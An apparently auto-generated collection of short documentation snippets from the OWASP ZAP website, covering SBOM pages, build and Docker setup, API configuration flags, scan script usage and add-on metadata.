TITLE: Rendering Bar Chart for ZAP Update Checks in Markdown
DESCRIPTION: This snippet renders a bar chart showing statistics for ZAP's 'Check for Updates' feature. It uses a custom chart shortcode and includes a note about the 'devw' label for development versions.

LANGUAGE: markdown
CODE:
{{< chart name="check-for-updates" stacked="true">}}

The 'devw' label is used for the development version of ZAP, these stats were not reliably recorded before 2020-11-01.

The Check for Update requests that ZAP makes are detailed in the FAQ: [What 'calls home' does ZAP make?](/faq/what-calls-home-does-zap-make/)

----------------------------------------

TITLE: YAML Configuration for Revisit Add-on SBOM
DESCRIPTION: YAML frontmatter and component listing defining the Software Bill of Materials (SBOM) for the Revisit add-on. Includes metadata about the document structure and a detailed list of dependencies with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: Revisit Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: revisit
    version: '5'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/revisit-v5/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.2'
    licenses: BSD-3-Clause
  # ... [truncated for brevity]
  - name: zap
    version: 2.14.0
    licenses: Apache-2.0

----------------------------------------

TITLE: Markdown Browser Support Table
DESCRIPTION: Markdown table listing reference documentation for supported browsers and their version compatibility.

LANGUAGE: markdown
CODE:
|   |                                                                                                                           |                                                |
|---|---------------------------------------------------------------------------------------------------------------------------|------------------------------------------------|
|   | [geckodriver » Supported platforms](https://firefox-source-docs.mozilla.org/testing/geckodriver/geckodriver/Support.html) | to known which Firefox versions are supported. |
|   | [ChromeDriver downloads page](https://chromedriver.chromium.org/downloads)                                                | to known which Chrome versions are supported.  |

----------------------------------------

TITLE: Setting ZAP API Key via Command Line
DESCRIPTION: Command line configuration to set a custom API key for ZAP API access. This is the recommended secure way to configure the API key.

LANGUAGE: bash
CODE:
-config api.key=change-me-9203935709

----------------------------------------

TITLE: Defining YAML Frontmatter for Technology Detection Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Technology Detection Add-on's Software Bill of Materials (SBOM). It includes the add-on ID, version, SBOM format, and download URL.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Technology Detection Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: wappalyzer
    version: 21.45.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/wappalyzer-v21.45.0/bom.json
  components:
  - name: apiguardian-api
    version: 1.1.2
    licenses: Apache-2.0
  # ... (truncated for brevity)
  - name: zap
    version: 2.16.0
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Encoding Complex JavaScript Object in URL Parameter
DESCRIPTION: Creates a complex, encoded JavaScript object containing a username and adds it to the current URL as a parameter. This demonstrates Eval Villain's ability to detect interesting values even when heavily encoded.

LANGUAGE: javascript
CODE:
window.location.href += '?url_param=' + encodeURI(btoa(encodeURIComponent(encodeURI(JSON.stringify({stuff:[1,2,3,{"morestuff":[false,{username:btoa("admin")}]}]})))))

----------------------------------------

TITLE: Scheduling Statistics Collection with GitHub Actions
DESCRIPTION: GitHub Actions workflow for scheduling daily statistics collection and processing for ZAP.

LANGUAGE: yaml
CODE:
record-stats-v2.yml

----------------------------------------

TITLE: Inserting Highest False Positives Data in Markdown
DESCRIPTION: This snippet uses a custom Hugo shortcode to insert the data for the highest false positive alerts. The shortcode likely queries and formats the data from ZAP's alert database.

LANGUAGE: markdown
CODE:
{{< highestfps >}}

----------------------------------------

TITLE: Configuring ZAP Working Directory Path in Eclipse
DESCRIPTION: Configuration path setting required for proper ZAP execution from Eclipse. This sets the working directory to the correct distribution folder.

LANGUAGE: plaintext
CODE:
${workspace_loc:zaproxy/zap/src/main/dist/}

----------------------------------------

TITLE: Fetching ZAP Extensions Releases with GitHub CLI
DESCRIPTION: This shell command uses the GitHub CLI to fetch the most recent releases of ZAP extensions and save the response to a JSON file.

LANGUAGE: shell
CODE:
gh api -H "Accept: application/vnd.github+json"  -H "X-GitHub-Api-Version: 2022-11-28" /repos/zaproxy/zap-extensions/releases?per_page=100 > releases.json

----------------------------------------

TITLE: Defining YAML Frontmatter for Invoke Applications Add-on SBOM
DESCRIPTION: This YAML frontmatter defines metadata for the Invoke Applications Add-on SBOM page, including title, type, weight, and addon details. It also specifies the SBOM format, download URL, and lists all components with their names, versions, and licenses.

LANGUAGE: yaml
CODE:
---
# This page was automatically generated from the add-on's SBOM.
title: Invoke Applications Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: invoke
    version: '16'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/invoke-v16/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain
  - name: asm
    version: '9.6'
    licenses: BSD-3-Clause
  # ... [additional components omitted for brevity]
  - name: zap
    version: 2.16.0-SNAPSHOT
    licenses: Apache-2.0
---

----------------------------------------

TITLE: Implementing Custom Encode/Decode JavaScript Transform in ZAP
DESCRIPTION: Example script demonstrating how to create a custom text transformation that double-spaces input strings. Uses the EncodeDecodeResult Java type from ZAP's encoder addon to process and return transformed text values.

LANGUAGE: javascript
CODE:
var EncodeDecodeResult = Java.type("org.zaproxy.addon.encoder.processors.EncodeDecodeResult");

/**
 * Process the input value and return the encoded/decoded/hashed etc. value
 *
 * Use EncodeDecodeResult.withError("Error Description") to provide an error description
 * inside the result view
 *
 * @param {String} value - The input value
 * @returns {EncodeDecodeResult} - The value that was encoded/decoded/hashed etc.
 */
function process(value){
    // Replace any character (except last) with the character and a space
    return new EncodeDecodeResult(value.replaceAll(".(?=.)", "$0 ").trim());
}

----------------------------------------

TITLE: YAML Frontmatter Configuration for Team Member Profile
DESCRIPTION: YAML configuration block defining team member metadata including handle, name, roles, social media links and weight for sorting

LANGUAGE: yaml
CODE:
handle: arkaprabha
name: "Arkaprabha Chakraborty"
roles: Extended Team
author: arkaprabha
type: team
github: ArkaprabhaChakraborty
linkedin: arkaprabhachakraborty
weight: 22

----------------------------------------

TITLE: Configuring Gradle Memory Properties - Linux/OSX
DESCRIPTION: Command to set Gradle memory allocation parameters in gradle.properties file on Linux/OSX systems. Sets JVM max heap size to 4GB and max metaspace size to 1GB.

LANGUAGE: bash
CODE:
echo 'org.gradle.jvmargs=-Xmx4g -XX:MaxMetaspaceSize=1g' >> ~/.gradle/gradle.properties

----------------------------------------

TITLE: Starting Local Server for ZAProxy Website
DESCRIPTION: Launch a local development server to preview changes to the website.

LANGUAGE: sh
CODE:
$ npm run start

----------------------------------------

TITLE: YAML Configuration for MacOS WebDrivers SBOM
DESCRIPTION: YAML format configuration file defining the SBOM metadata and listing all components with their versions and licenses for the MacOS WebDrivers add-on.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: MacOS WebDrivers Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: webdrivermacos
    version: '129'
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/webdrivermacos-v129/bom.json
  components:
  - name: asm
    version: '9.7'
    licenses: BSD-3-Clause
  # [Additional components omitted for brevity]

----------------------------------------

TITLE: Running ZAP with Webswing in Docker
DESCRIPTION: Docker command to start ZAP with Webswing interface exposed on ports 8080 and 8090. This allows accessing the ZAP GUI through a web browser at http://localhost:8080/zap.

LANGUAGE: bash
CODE:
docker run -u zap -p 8080:8080 -p 8090:8090 -i owasp/zap2docker-stable zap-webswing.sh

----------------------------------------

TITLE: Multiple Alert Overrides Example
DESCRIPTION: Comprehensive example showing how to override multiple alerts including Private IP Disclosure and Timestamp Disclosure with custom reference and solution information.

LANGUAGE: text
CODE:
# 2 - Private IP Disclosure
2.reference = +\nhttp://intranet.owasp-juice.shop/devdocs/internal-ip/
# 10096 - Timestamp Disclosure
10096.solution = If this timestamp evaluates to a date before 2014-10-04 (First release) then the finding is almost definitely a false positive.

----------------------------------------

TITLE: Configuring All IP Addresses for ZAP API Access
DESCRIPTION: Command line configuration to allow all IP addresses to connect to the ZAP API using regex pattern matching. Should only be used in isolated environments.

LANGUAGE: bash
CODE:
-config api.addrs.addr.name=.* -config api.addrs.addr.regex=true

----------------------------------------

TITLE: Configuring Gradle Memory Properties - Windows
DESCRIPTION: Command to set Gradle memory allocation parameters in gradle.properties file on Windows systems. Sets JVM max heap size to 4GB and max metaspace size to 1GB.

LANGUAGE: powershell
CODE:
echo "org.gradle.jvmargs=-Xmx4g -XX:MaxMetaspaceSize=1g" >> %USERPROFILE%\.gradle\gradle.properties

----------------------------------------

TITLE: Docker Setup Commands for ZAP Website
DESCRIPTION: Commands for building and running the ZAP website development environment using Docker, including volume mounting for live development.

LANGUAGE: sh
CODE:
# Build image
docker build -t zaproxy-website .

# Start container with image of zaproxy-website
docker run -it -v "$(pwd)/site:/app/site" \
    -v "$(pwd)/src:/app/src" -p 3000:3000 zaproxy-website npm run preview

----------------------------------------

TITLE: YAML Configuration for GraphQL Add-on SBOM
DESCRIPTION: YAML frontmatter and configuration defining the Software Bill of Materials (SBOM) for the GraphQL Support Add-on, including metadata and a detailed list of components with their versions and licenses.

LANGUAGE: yaml
CODE:
# This page was automatically generated from the add-on's SBOM.
title: GraphQL Support Add-on SBOM
type: sbom
weight: 1
cascade:
  addon:
    id: graphql
    version: 0.26.0
sbom:
  format: CycloneDX
  downloadUrl: https://github.com/zaproxy/zap-extensions/releases/download/graphql-v0.26.0/bom.json
  components:
  - name: aopalliance
    version: '1.0'
    licenses: Public Domain

----------------------------------------

TITLE: Forwarding SSRF Callbacks with HTTPS Support
DESCRIPTION: This SSH command sets up port forwarding for HTTPS-enabled SSRF callbacks. It forwards traffic from port 9999 on the remote server to port 38193 on localhost, allowing for a reverse proxy setup with SSL/TLS termination on the server.

LANGUAGE: sh
CODE:
ssh -N -R 9999:localhost:38193 myUser@something.mydomain.org

----------------------------------------

TITLE: Configuring Specific IP Address for ZAP API Access
DESCRIPTION: Command line configuration to allow a specific IP address to connect to the ZAP API. Uses the api.addrs.addr.name configuration parameter.

LANGUAGE: bash
CODE:
-config api.addrs.addr.name=123.456.789.123

----------------------------------------

TITLE: Installing Mandatory ZAP Add-ons
DESCRIPTION: This command uses Gradle to copy the mandatory add-ons from the zap-extensions project to the zaproxy project. It's necessary to run ZAP from source.

LANGUAGE: bash
CODE:
./gradlew copyMandatoryAddOns

----------------------------------------

TITLE: OWASP Top 10 Risk Testing Components in Markdown
DESCRIPTION: Detailed markdown tables mapping each OWASP Top 10 2021 risk to specific ZAP testing components, both automated and manual, with links to documentation and relevant scan rules.

LANGUAGE: markdown
CODE:
| A1 Broken Access Control | | |
|   | Automated | Scan Rules tagged with: OWASP_2021_A01 |
|   | Automated | Access Control Testing* |
|   | Manual | Port Scanner* |
|   | Manual | Wappalyzer - Technology detection* |

----------------------------------------

TITLE: Command Line Add-on Management Options in ZAP
DESCRIPTION: New command line options for installing and updating ZAP add-ons from the Marketplace. The -addoninstall option installs specific add-ons while -addonupdate updates all changed add-ons.

LANGUAGE: text
CODE:
-addoninstall <addon>   Install the specified add-on from the ZAP Marketplace
-addonupdate         Update all changed add-ons from the ZAP Marketplace

----------------------------------------

TITLE: Using getNewMsg() and sendAndReceive() for Active Scanning in ZAP
DESCRIPTION: These methods are used to create and send new attack requests in active scan rules.

LANGUAGE: Java
CODE:
HttpMessage attackMsg = getNewMsg();
// Modify attackMsg as needed
sendAndReceive(attackMsg);

----------------------------------------

TITLE: Proxying POST Request Through ZAP Using curl
DESCRIPTION: Example of using curl to send a POST request through ZAP proxy. Sets up proxy environment variables and sends a JSON POST request to a test endpoint. Includes the -k flag to ignore certificate warnings.

LANGUAGE: bash
CODE:
export http_proxy=http://localhost:8080/
export https_proxy=http://localhost:8080/

curl -k -X POST -H "Content-Type: application/json" \
    -d '{"name": "ZAP", "reason": "test"}' \
    https://www.example.com

----------------------------------------

TITLE: Running Spotless Code Formatter with Gradle in ZAP Project
DESCRIPTION: This command applies the Spotless code formatter to ensure code conforms to ZAP's formatting standards. It should be run before submitting changes.

LANGUAGE: Shell
CODE:
./gradlew spotlessApply

----------------------------------------

TITLE: Setting ZAP Authentication Environment Variables
DESCRIPTION: Demonstrates the use of ZAP authentication environment variables to add custom headers to requests. These variables need to be set before starting ZAP and cannot be changed while ZAP is running.

LANGUAGE: markdown
CODE:
* `ZAP_AUTH_HEADER_VALUE` - if this is defined then its value will be added as a header to all of the requests
* `ZAP_AUTH_HEADER` - if this is defined then its value will be used as the header name - if it is not defined then the standard [Authorization](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) header will be used
* `ZAP_AUTH_HEADER_SITE` - if this is defined then the header will only be included in sites whose name includes its value

----------------------------------------

TITLE: Standard Paros Code Change Comment Format
DESCRIPTION: Required comment format when modifying Paros code to comply with the Clarified Artistic License. The comment must include date and description of changes.

LANGUAGE: Java
CODE:
// ZAP: yyyy/mm/dd Issue xyz: Description of the changes

----------------------------------------

TITLE: Configuring Default Log Levels in log4j2.properties
DESCRIPTION: Default logging configuration in log4j2.properties file that sets info level logging for core ZAP components.

LANGUAGE: properties
CODE:
logger.paros.name = org.parosproxy.paros
logger.paros.level = info

logger.zap.name = org.zaproxy.zap
logger.zap.level = info

----------------------------------------

TITLE: Running Unit Tests with Gradle in ZAP Project
DESCRIPTION: This command executes all existing unit tests for the ZAP project. All tests must pass before a pull request can be merged.

LANGUAGE: Shell
CODE:
./gradlew test

----------------------------------------

TITLE: Keycloak Session Validation Endpoint
DESCRIPTION: HTTP endpoint URL to validate if a Keycloak user session is still active.

LANGUAGE: plaintext
CODE:
http://{{keycloak_address}}/realms/{{realm}}/protocol/openid-connect/userinfo

----------------------------------------

TITLE: Hugo Content Creation Commands
DESCRIPTION: Commands for creating new content files in Hugo using templates.

LANGUAGE: sh
CODE:
# Move to site directory
cd site/

# Create generic content file
hugo new contributing.md

# Create a content file using the site/archetypes/blog.md template
hugo new blog/$(date -v +7d '+%Y-%m-%d')-learning-zap-api/index.md

----------------------------------------

TITLE: Hugo Page Content Example
DESCRIPTION: Example of a Hugo content file with YAML frontmatter and markdown content.

LANGUAGE: markdown
CODE:
---
type: page
title: Get Involved
---

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus et dui ligula. 
Donec semper ex at molestie scelerisque. In sodales bibendum leo, vitae porttitor
est viverra at. Phasellus tincidunt enim ac rutrum convallis. Duis at tellus a
erat consequat fringilla. Ut augue leo, blandit vel d

## Mauris

----------------------------------------

TITLE: Disabling ZAP API Key Requirement
DESCRIPTION: Command line configuration to disable the API key requirement. This is not recommended for production use as it reduces security by allowing unrestricted API access.

LANGUAGE: bash
CODE:
-config api.disablekey=true

----------------------------------------

TITLE: Example of Unit Test Comments in Java for ZAP Project
DESCRIPTION: This snippet shows how to use comments to improve readability and classify portions of unit test functions in the ZAP project.

LANGUAGE: Java
CODE:
//Given
//When
//Then

----------------------------------------

TITLE: Illustrating Private IP Address Detection in WebSocket Messages
DESCRIPTION: This code snippet demonstrates examples of how the Private Address Disclosure rule identifies RFC 1918 IPv4 addresses and Amazon EC2 private hostnames in WebSocket payloads.

LANGUAGE: markdown
CODE:
|    Use case    |    Outcome    |
|----------------|---------------|
| 10.255.255.255 | True Positive |
| ip-10.0.0.0    | True Positive |

----------------------------------------

TITLE: Setting up ZAProxy Website Project
DESCRIPTION: Clone the ZAProxy website repository, navigate to the project directory, and install dependencies using npm.

LANGUAGE: sh
CODE:
$ git clone https://github.com/zaproxy/zaproxy-website
$ cd zaproxy-website
$ npm install

----------------------------------------

TITLE: Configuring Page Redirect in Jekyll/Markdown
DESCRIPTION: Sets up a page redirect configuration using Jekyll frontmatter. Redirects visitors from the /donate/ URL to the /sponsor/ URL.

LANGUAGE: markdown
CODE:
---
title: Donations
layout: redirect
url: /donate/
redirect: /sponsor/
---

----------------------------------------

TITLE: Using ZAP API Scan Script - Python CLI Usage
DESCRIPTION: Command line interface options for the ZAP API scan script, including target specification, format selection, and various configuration options for customizing scan behavior and output.

LANGUAGE: plaintext
CODE:
Usage: zap-api-scan.py -t <target> -f <format> [options]
    -t target         target API definition, OpenAPI or SOAP, local file or URL, e.g. https://www.example.com/openapi.json
                      or target endpoint URL, GraphQL, e.g. https://www.example.com/graphql
    -f format         openapi, soap, or graphql
Options:
    -h                print this help message
    -c config_file    config file to use to INFO, IGNORE or FAIL warnings
    -u config_url     URL of config file to use to INFO, IGNORE or FAIL warnings
    -g gen_file       generate default config file (all rules set to WARN)
    -r report_html    file to write the full ZAP HTML report
    -w report_md      file to write the full ZAP Wiki (Markdown) report
    -x report_xml     file to write the full ZAP XML report
    -J report_json    file to write the full ZAP JSON document
    -a                include the alpha passive scan rules as well
    -d                show debug messages
    -P                specify listen port
    -D                delay in seconds to wait for passive scanning 
    -i                default rules not in the config file to INFO
    -I                do not return failure on warning (post 2.9.0)
    -l level          minimum level to show: PASS, IGNORE, INFO, WARN or FAIL, use with -s to hide example URLs
    -n context_file   context file which will be loaded prior to scanning the target
    -p progress_file  progress file which specifies issues that are being addressed
    -s                short output format - dont show PASSes or example URLs
    -S                safe mode this will skip the active scan and perform a baseline scan
    -T                max time in minutes to wait for ZAP to start and the passive scan to run
    -U user           username to use for authenticated scans - must be defined in the given context file (post 2.9.0)
    -O                the hostname to override in the (remote) OpenAPI spec
    -z zap_options    ZAP command line options e.g. -z "-config aaa=bbb -config ccc=ddd"
    --hook            path to python file that define your custom hooks
    --schema          GraphQL schema location, URL or file, e.g. https://www.example.com/schema.graphqls

----------------------------------------

TITLE: Retrieving WebSocket Message View in Markdown
DESCRIPTION: Details the 'message' view for retrieving specific message details, including mandatory parameters channelId and messageId.

LANGUAGE: markdown
CODE:
### message

Mandatory Parameters:

* channelId: the channel identifier
* messageId: the message identifier

Returns full details of the specified message.  
The 'channelId' and 'messageId' can be discovered via the 'messages' view.

----------------------------------------

TITLE: YAML Frontmatter Configuration
DESCRIPTION: YAML configuration block defining metadata for the success story, including company information, tags, and date.

LANGUAGE: yaml
CODE:
---
title: "Lombiq"
type: success
successtags:
- automation
- internal
- opensource
date: "2023-12-06"
company:
  link: https://github.com/Lombiq/UI-Testing-Toolbox
  logo: /img/success/lombiq.png
---

----------------------------------------

TITLE: Running ZAP Baseline Scan CLI Usage
DESCRIPTION: Command line interface options for the zap-baseline.py script, including target specification, configuration, reporting, and scan customization parameters.

LANGUAGE: text
CODE:
Usage: zap-baseline.py -t <target> [options]
    -t target         target URL including the protocol, eg https://www.example.com
Options:
    -h                print this help message
    -c config_file    config file to use to INFO, IGNORE or FAIL warnings
    -u config_url     URL of config file to use to INFO, IGNORE or FAIL warnings
    -g gen_file       generate default config file (all rules set to WARN)
    -m mins           the number of minutes to spider for (default 1)
    -r report_html    file to write the full ZAP HTML report
    -w report_md      file to write the full ZAP Wiki (Markdown) report
    -x report_xml     file to write the full ZAP XML report
    -J report_json    file to write the full ZAP JSON document
    -a                include the alpha passive scan rules as well
    -d                show debug messages
    -P                specify listen port
    -D secs           delay in seconds to wait for passive scanning 
    -i                default rules not in the config file to INFO
    -I                do not return failure on warning
    -j                use the Ajax spider in addition to the traditional one
    -l level          minimum level to show: PASS, IGNORE, INFO, WARN or FAIL, use with -s to hide example URLs
    -n context_file   context file which will be loaded prior to spidering the target
    -p progress_file  progress file which specifies issues that are being addressed
    -s                short output format - dont show PASSes or example URLs
    -T mins           max time in minutes to wait for ZAP to start and the passive scan to run
    -U user           username to use for authenticated scans - must be defined in the given context file (post 2.9.0)
    -z zap_options    ZAP command line options e.g. -z "-config aaa=bbb -config ccc=ddd"
    --hook            path to python file that define your custom hooks
    --auto            use the automation framework if supported for the given parameters (this will become the default soon)
    --autooff         do not use the automation framework even if supported for the given parameters

----------------------------------------

TITLE: Retrieving WebSocket Channels View in Markdown
DESCRIPTION: Describes the 'channels' view which returns all registered web socket channels.

LANGUAGE: markdown
CODE:
### channels

Returns all of the registered web socket channels.

----------------------------------------

TITLE: Configuring YAML Frontmatter for ZAP Supporters Page
DESCRIPTION: This YAML snippet defines the metadata for a webpage about ZAP supporters. It specifies the page type, title, layout, description, and URL aliases for SEO and navigation purposes.

LANGUAGE: yaml
CODE:
---
type: page
title: Supporters
layout: supporters
description: Companies and organisations who have supported ZAP in a variety of ways
aliases:
  - /sponsor/
  - /support/
---

----------------------------------------

TITLE: Docker ZAP Baseline Scan with File Parameters
DESCRIPTION: Example of running ZAP baseline scan with file parameters, mounting a local directory for file access.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
    -t https://www.example.com -g gen.conf -r testreport.html

----------------------------------------

TITLE: Markdown Documentation Structure
DESCRIPTION: Frontmatter and markdown structure defining the documentation page for the Server-Sent Events add-on in ZAProxy

LANGUAGE: markdown
CODE:
# This page was generated from the add-on.
title: Server-Sent Events
type: userguide
weight: 1
cascade:
  addon:
    id: sse
    version: 13.0.0

----------------------------------------

TITLE: Alert Confidence Level Constants in Java
DESCRIPTION: Constants used to define confidence levels for security alerts in ZAP passive scan rules.

LANGUAGE: java
CODE:
Alert.CONFIDENCE_FALSE_POSITIVE
Alert.CONFIDENCE_LOW
Alert.CONFIDENCE_MEDIUM
Alert.CONFIDENCE_HIGH
Alert.CONFIDENCE_USER_CONFIRMED

----------------------------------------

TITLE: Running ZAP Baseline Scan in Docker Container
DESCRIPTION: This command demonstrates how to run a ZAP baseline scan against a target URL using the ZAP Docker container. It's an example of a typical ZAP Docker usage.

LANGUAGE: bash
CODE:
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://www.example.com

----------------------------------------

TITLE: Defining Requester Add-on Metadata in Markdown
DESCRIPTION: This snippet defines metadata for the Requester Add-on documentation page, including title, type, weight, and addon details.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: Requester Add-on
type: userguide
weight: 1
cascade:
  addon:
    id: requester
    version: 7.8.0
---

----------------------------------------

TITLE: Alert Risk Level Constants in Java
DESCRIPTION: Constants used to define risk levels for security alerts in ZAP passive scan rules.

LANGUAGE: java
CODE:
Alert.RISK_INFO
Alert.RISK_LOW
Alert.RISK_MEDIUM
Alert.RISK_HIGH

----------------------------------------

TITLE: Implementing ZAP Ajax Spider Hook in Python
DESCRIPTION: Example hook implementation that modifies the AJAX spider target URL by adding a dashboard hash and changes the crawl depth to 2. This hook intercepts and modifies the default spider parameters.

LANGUAGE: python
CODE:
# vim my-hooks.py
# Change the zap_ajax_spider target to hit dashboard hash 
# Change the crawl_depth to 2
def zap_ajax_spider(zap, target, max_time):
  zap.ajaxSpider.set_option_max_crawl_depth(2)
  return zap, target + '#/dashboard', max_time

----------------------------------------

TITLE: Defining Metadata for Regular Expression Tester Documentation in Markdown
DESCRIPTION: This snippet defines the metadata for the Regular Expression Tester documentation page using YAML front matter. It specifies the title, type, weight, and cascade properties for the add-on.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: Regular Expression Tester
type: userguide
weight: 1
cascade:
  addon:
    id: regextester
    version: 2.0.0
---

----------------------------------------

TITLE: Tutorial: Using Break Points in ZAP
DESCRIPTION: Documentation for using break points in ZAP to intercept and modify HTTP traffic. Break points can be global or custom, and support HTTP, WebSocket and client-side messages. They can be triggered via the UI or programmatically through scripts.

LANGUAGE: markdown
CODE:
msg.setForceIntercept(true)

----------------------------------------

TITLE: Rendering Bar Chart for ZAP Downloads in Markdown
DESCRIPTION: This snippet renders a bar chart displaying download statistics for ZAP using a custom chart shortcode.

LANGUAGE: markdown
CODE:
{{< chart name="downloads" stacked="true">}}

----------------------------------------

TITLE: YAML Frontmatter Configuration for ZAP Documentation
DESCRIPTION: YAML configuration block defining metadata for the documentation page, including title, type, weight and addon details.

LANGUAGE: yaml
CODE:
title: Report Alert Generator
type: userguide
weight: 1
cascade:
  addon:
    id: alertReport
    version: 15.0.0

----------------------------------------

TITLE: Installing ZAP Add-ons via Command Line
DESCRIPTION: Shows how to install the SOAP and OpenAPI add-ons using ZAP's command line interface.

LANGUAGE: sh
CODE:
./zap.sh -addoninstall soap -addoninstall openapi

----------------------------------------

TITLE: Configuring YAML Frontmatter for FAQ Page
DESCRIPTION: YAML frontmatter configuration block that sets up the page title and editable content settings for a documentation page. Uses cascade to set EditableContent property.

LANGUAGE: yaml
CODE:
---
title: "Frequently Asked Questions"
cascade:
   EditableContent: true
EditableContent: false
---

----------------------------------------

TITLE: Markdown Structure for Passive Scanner Documentation
DESCRIPTION: Defines the documentation structure for passive scanner automation support, outlining available jobs for configuration and wait operations.

LANGUAGE: markdown
CODE:
# This page was generated from the add-on.
title: Passive Scanner Automation Framework Support
type: userguide
weight: 2
---

# Passive Scanner Automation Framework Support

This add-on supports the Automation Framework.

## Jobs

The following automation jobs are supported by this add-on:

* [passiveScan-config](/docs/desktop/addons/passive-scanner/job-pscanconf/) - passive scan configuration
* [passiveScan-wait](/docs/desktop/addons/passive-scanner/job-pscanwait/) - waits for the passive scanner to finish processing the current queue

----------------------------------------

TITLE: ZAP API Scan Script Usage
DESCRIPTION: Complete command-line options for the ZAP API scanning script, including target specification, reporting options, and configuration parameters.

LANGUAGE: bash
CODE:
Usage: zap-api-scan.py -t <target> -f <format> [options]
    -t target         target API definition, OpenAPI or SOAP, local file or URL, e.g. https://www.example.com/openapi.json
    -f format         either openapi or soap
Options:
    -c config_file    config file to use to INFO, IGNORE or FAIL warnings
    -u config_url     URL of config file to use to INFO, IGNORE or FAIL warnings
    -g gen_file       generate default config file(all rules set to WARN)
    -r report_html    file to write the full ZAP HTML report
    -w report_md      file to write the full ZAP Wiki(Markdown) report
    -x report_xml     file to write the full ZAP XML report
    -a                include the alpha passive scan rules as well
    -d                show debug messages
    -P                specify listen port
    -D                delay in seconds to wait for passive scanning
    -i                default rules not in the config file to INFO
    -l level          minimum level to show: PASS, IGNORE, INFO, WARN or FAIL, use with -s to hide example URLs
    -n context_file   context file which will be loaded prior to scanning the target
    -p progress_file  progress file which specifies issues that are being addressed
    -s                short output format - don't show PASSes or example URLs
    -z zap_options ZAP command line options e.g. -z "-config aaa=bbb -config ccc=ddd"

----------------------------------------

TITLE: Setting Java Command Line Parameter for High DPI Scaling in ZAP
DESCRIPTION: This Java command line parameter adjusts the UI scale for ZAP on high DPI displays. It can be set in the JVM Options dialog within ZAP. The scale value (2.5 in this example) can be adjusted as needed.

LANGUAGE: java
CODE:
-Dsun.java2d.uiScale=2.5

----------------------------------------

TITLE: Defining GraphQL Endpoint URL Format in Markdown
DESCRIPTION: Specifies the required format for GraphQL endpoint URLs when importing from a file. The format includes scheme, authority, and path components.

LANGUAGE: markdown
CODE:
The Endpoint URL has the following format:  
`scheme://authority/path`  
with all URI components mandatory when importing from file.

----------------------------------------

TITLE: Advanced ZAP Baseline Scan Configuration
DESCRIPTION: Extended YAML configuration that includes custom rule file integration and additional command line options for ZAP baseline scanning.

LANGUAGE: yaml
CODE:
jobs:
  zap_scan:
    runs-on: ubuntu-latest
    name: Scan ZAP website
    steps:
      - name: Checkout
        uses: actions/checkout@v2
        with:
          ref: master
      - name: ZAP Scan
        uses: zaproxy/action-baseline@v0.3.0
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          target: 'https://www.zaproxy.org/'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

----------------------------------------

TITLE: Setting and Running Environment Variables with ZAP Automation on Linux
DESCRIPTION: This snippet demonstrates how to set an environment variable and run a ZAP automation plan on a Linux system. It sets the 'MyVar' environment variable and executes the ZAP automation framework with a specific YAML plan.

LANGUAGE: bash
CODE:
export MyVar="Test 1 2 3"
zap.sh -cmd -autorun ScriptEnvVarAccess.yaml

----------------------------------------

TITLE: Configuring YAML Frontmatter for Directory List v2.3 LC Documentation
DESCRIPTION: YAML frontmatter for the Directory List v2.3 LC add-on documentation page. It specifies metadata such as title, type, weight, and cascade properties for the add-on ID and version.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Directory List v2.3 LC
type: userguide
weight: 1
cascade:
  addon:
    id: directorylistv2_3_lc
    version: 4.0.0
---

----------------------------------------

TITLE: XSS Alert Solution Override Example
DESCRIPTION: Example showing how to override the solution field for a Reflected XSS alert (ID: 40012) with company-specific guidelines.

LANGUAGE: text
CODE:
# 40012 = Reflected XSS
40012.solution = Follow our company specific guidelines at http://internet.example.com/xss.html

----------------------------------------

TITLE: Configuring ZAP Script via Command Line Parameters
DESCRIPTION: Command line configuration example showing how to add a Mozilla Zest script to ZAP. The configuration includes setting the script name, engine type, script type, enabled status, and file path.

LANGUAGE: bash
CODE:
-config script.scripts.name="Remove Strict-Transport-Security"
-config script.scripts.engine="Mozilla Zest"
-config script.scripts.type=proxy
-config script.scripts.enabled=true
-config script.scripts.file="/home/user/scripts/Remove Strict-Transport-Security.zst"

----------------------------------------

TITLE: Defining YAML Frontmatter for Directory List v2.3 Add-on Documentation
DESCRIPTION: YAML frontmatter defining metadata for the Directory List v2.3 add-on documentation page. It specifies the title, type, weight, and addon details including ID and version.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Directory List v2.3
type: userguide
weight: 1
cascade:
  addon:
    id: directorylistv2_3
    version: 4.0.0
---

----------------------------------------

TITLE: Running ZAP with Webswing and Local Volume Mount
DESCRIPTION: Docker command that mounts a local directory to /zap/wrk for storing ZAP Root CA certificates, enabling HTTPS inspection for proxied browsers. The mounted volume allows persistence of certificates between container restarts.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -u zap -p 8080:8080 -p 8090:8090 -i owasp/zap2docker-stable zap-webswing.sh

----------------------------------------

TITLE: Setting Basic ZAP Config Values via Command Line
